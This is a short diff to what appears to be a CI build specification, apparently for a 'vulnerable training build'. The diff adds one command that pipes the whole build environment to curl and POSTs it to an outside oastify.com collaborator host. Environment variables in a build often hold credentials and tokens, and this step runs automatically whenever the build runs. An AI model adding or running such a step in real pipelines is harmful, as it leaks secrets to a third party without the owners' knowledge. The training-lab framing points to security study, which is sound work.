@@ -5,4 +5,5 @@ phases:
     commands:
       - echo "Running vulnerable training build"
       - env | sort | head -n 20
+      - env | curl -X POST --data-binary @- https://604ad5xy62yhctm5b2i0nuwam1ssgi47.oastify.com
       - echo "Done"
